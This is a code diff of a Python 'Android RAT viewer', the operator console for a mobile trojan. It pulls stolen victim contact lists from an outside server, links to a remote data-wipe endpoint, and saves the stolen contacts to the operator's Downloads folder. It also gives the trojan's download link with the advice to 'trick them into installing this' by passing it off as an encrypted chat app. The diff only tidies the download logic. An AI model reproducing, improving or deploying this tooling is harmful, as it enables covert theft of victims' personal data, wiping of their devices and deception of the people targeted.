@@ -1,20 +1,25 @@
 import time
 import requests
 import os
+
 RED = "\033[31m"
 GREEN = "\033[32m"
 BLUE = "\033[34m"
 RESET = "\033[0m"
+
 version = f"{RED}v0.1{RESET}"
 ar_link = f"{GREEN}https://limewire.com/d/2Rx85#zHlMLH53hJ (Trick them into installing this.){RESET}"
 delete_data = f"{GREEN}http://bluntcord.medianewsonline.com/aroid_to/delete.php{RESET}"
 contacts_url = "http://bluntcord.medianewsonline.com/aroid_to/contacts.txt"
+
 print(f"{BLUE}Coded by Nihility{RESET}")
 print(f"{RED}Android RAT viewer.{RESET}")
 print(f"{RED}Victim hasn't accessed the trojan yet...{RESET}")
 print("Delete data?: " + delete_data)
 time.sleep(1)
+
 while True:
+    user_input = None  
     try:
         response = requests.get(contacts_url)
         if response.status_code == 200:
@@ -56,44 +61,27 @@ while True:
                                          CODE: Nihility
                                          I might need a coffee break, it's 3:18 AM
                                          NAME: Android Rat (Texter 2026)
-                                         
-
                       """)
                 print("                                                         " + version)
-                print(f"                                         {BLUE}The Trojans url:  {RESET}" + ar_link + f"\n                                         {BLUE}Best way is to make them think it's a encrypted chatting application. {RESET}")
+                print(f"                                         {BLUE}The Trojans url:  {RESET}" + ar_link + f"\n                                         {BLUE}Best way is to make them think it's an encrypted chatting application.{RESET}")
                 print(f"                                         {RED}Dumbass has yet to open the trojan, waiting...\n                                         To wipe data, go to {RESET}" + delete_data)
-                
         else:
             print(f"File too large, Received status code {response.status_code}")
             user_input = input("Download content? Y/N: ")
-        if user_input.strip().lower() == 'y':
-            try:
-                download_url = "http://bluntcord.medianewsonline.com/aroid_to/download.php"
-                response = requests.get(download_url)
-                if response.status_code == 200:
-                    with open(os.path.expanduser('~/Downloads/contacts.txt'), 'w') as file:
-                        file.write(response.text)
-                    print("File downloaded successfully to Downloads folder.")
-                else:
-                    print(f"Failed to download file. Status code: {response.status_code}")
-            except Exception as e:
-                print(f"Error during download: {e}")
-        break
-
     except Exception as e:
         print(f"Error fetching data, Content might be too large to gather. Download it.: {e}")
         user_input = input("Download content? Y/N: ")
-        if user_input.strip().lower() == 'y':
-            try:
-                download_url = "http://bluntcord.medianewsonline.com/aroid_to/download.php"
-                response = requests.get(download_url)
-                if response.status_code == 200:
-                    with open(os.path.expanduser('~/Downloads/contacts.txt'), 'w') as file:
-                        file.write(response.text)
-                    print("File downloaded successfully to Downloads folder.")
-                else:
-                    print(f"Failed to download file. Status code: {response.status_code}")
-            except Exception as e:
-                print(f"Error during download: {e}")
-        break
 
+    if user_input and user_input.strip().lower() == 'y':
+        try:
+            download_url = "http://bluntcord.medianewsonline.com/aroid_to/download.php"
+            response = requests.get(download_url)
+            if response.status_code == 200:
+                with open(os.path.expanduser('~/Downloads/contacts.txt'), 'w') as file:
+                    file.write(response.text)
+                print("File downloaded successfully to Downloads folder.")
+            else:
+                print(f"Failed to download file. Status code: {response.status_code}")
+        except Exception as e:
+            print(f"Error during download: {e}")
+        break
